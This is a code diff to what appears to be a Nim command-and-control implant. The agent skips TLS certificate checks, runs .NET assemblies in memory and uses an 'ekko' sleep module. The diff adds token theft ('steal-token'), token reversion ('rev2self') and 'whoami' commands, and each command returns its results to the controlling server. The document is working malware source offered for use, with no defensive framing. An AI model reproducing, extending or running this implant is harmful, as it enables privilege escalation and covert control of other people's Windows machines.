@@ -1,6 +1,7 @@
 import httpclient, base64, json, osproc, random, os, strutils, net
 include ./libs_agent/executeass
 include ./libs_agent/ekko
+include ./libs_agent/steal_token
 
 proc get_request_headers(url: string, api_key: string, identifier:string):string =
     let client = newHttpClient(sslContext=newContext(verifyMode=CVerifyNone))
@@ -57,6 +58,21 @@ proc main() =
                     var command_output = executeassembly(convertToByteSeq(assembly_content),[],$(int(rand(float(100000000000000000)))))
                     var output_json = %*[{"task_id":task_id,"output":encode(command_output)}]
                     var output = post_request_headers(url&"output", $secret_key, $output_json, $identifier)
+                elif $module_method == "steal-token":
+                    discard ImpersonateToken(parseInt(method_arguments))
+                    var username = GetUser()
+                    var output_json = %*[{"task_id":task_id,"output":encode("Impersonated: "&username)}]
+                    var output = post_request_headers(url&"output", $secret_key, $output_json, $identifier)
+                elif $module_method == "rev2self":
+                    discard reverttoken()
+                    var username = GetUser()
+                    var output_json = %*[{"task_id":task_id,"output":encode("Reverting token to: "&username)}]
+                    var output = post_request_headers(url&"output", $secret_key, $output_json, $identifier)
+                elif $module_method == "whoami":
+                    var username = GetUser()
+                    var output_json = %*[{"task_id":task_id,"output":encode(username)}]
+                    var output = post_request_headers(url&"output", $secret_key, $output_json, $identifier)
+
     #let output = execute_command("dir C:\\Users\\")
     #echo "command output :"
     #echo $output
